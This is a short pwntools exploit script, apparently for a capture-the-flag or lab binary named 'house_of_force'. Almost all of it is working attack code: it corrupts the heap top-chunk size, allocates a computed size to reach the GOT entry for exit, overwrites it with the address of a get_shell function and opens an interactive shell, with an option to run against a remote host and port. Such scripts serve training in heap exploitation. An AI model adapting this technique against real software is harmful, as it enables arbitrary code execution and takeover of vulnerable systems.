from pwn import *

# Many built-in settings can be controlled via CLI and show up in "args"
# For example, to dump all data sent/received, and disable ASLR
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
b main
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './house_of_force'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'
# Delete core files after finished
context.delete_corefiles = True
context.arch = elf.arch

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
p = start()

def create(size, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Size: ', str(size).encode())
    p.sendafter(b'Data: ', data)

def write(ptrIdx, writeIdx, value):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'ptr idx: ', str(ptrIdx).encode())
    p.sendlineafter(b'write idx: ', str(writeIdx).encode())
    p.sendlineafter(b'value: ', str(value).encode())

def delta(x, y):
    return (0xffffffff - x) + y #elf.symbols['exit'] - (heap + 0x1c) 
create(16,b'a'*24)
heap = int(p.recv(9),16)
write(0,5,0xffffffff)

create(elf.got['exit'] - (heap+5*4)  - 8 , b"Y")
#got_exit
info(hex(elf.got['exit']))
create(4,p32(elf.symbols['get_shell']))
p.interactive()